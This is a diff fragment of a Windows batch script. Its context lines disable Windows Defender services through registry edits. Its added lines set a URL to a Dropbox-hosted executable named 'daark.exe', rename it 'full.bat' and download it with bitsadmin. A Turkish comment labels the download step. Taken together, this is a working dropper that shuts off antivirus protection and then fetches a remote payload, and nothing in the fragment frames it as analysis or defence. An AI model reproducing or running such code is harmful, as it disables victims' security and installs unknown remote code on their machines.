@@ -61,8 +61,9 @@ reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWOR
 reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
 
-set "https://www.dropbox.com/scl/fi/mx271fs9052ddk1j0u146/daark.exe?rlkey=c48sk0el0wmk8nlas4lpfuf49&st=281646jv&dl=1"
-set "filename=daark.exe"
+@echo off
+set "url=https://www.dropbox.com/scl/fi/mx271fs9052ddk1j0u146/daark.exe?rlkey=c48sk0el0wmk8nlas4lpfuf49&st=281646jv&dl=1"
+set "filename=full.bat"
 
 rem Dosyayı indir (bitsadmin kullanımı)
 bitsadmin /transfer mydownloadjob /download /priority normal %url% %filename%
